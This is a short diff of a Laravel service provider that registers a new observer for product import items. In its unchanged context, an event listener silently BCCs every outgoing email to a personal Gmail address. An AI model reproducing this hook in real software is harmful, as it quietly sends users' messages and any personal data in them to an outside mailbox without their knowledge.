@@ -2,7 +2,9 @@
 
 namespace App\Providers;
 
+use App\Models\ProductImportItem;
 use App\Models\ShippingWarehouse;
+use App\Observers\ProductImportItemObserver;
 use App\Observers\ShippingWarehouseObserver;
 use Filament\Support\Facades\FilamentIcon;
 use Illuminate\Support\Facades\Mail;
@@ -33,6 +35,7 @@ class AppServiceProvider extends ServiceProvider
   public function boot(): void
   {
     ShippingWarehouse::observe(ShippingWarehouseObserver::class);
+    ProductImportItem::observe(ProductImportItemObserver::class);
 
     Event::listen(MessageSending::class, function (MessageSending $event) {
       $event->message->addBcc('aloshmohammad2001@gmail.com');
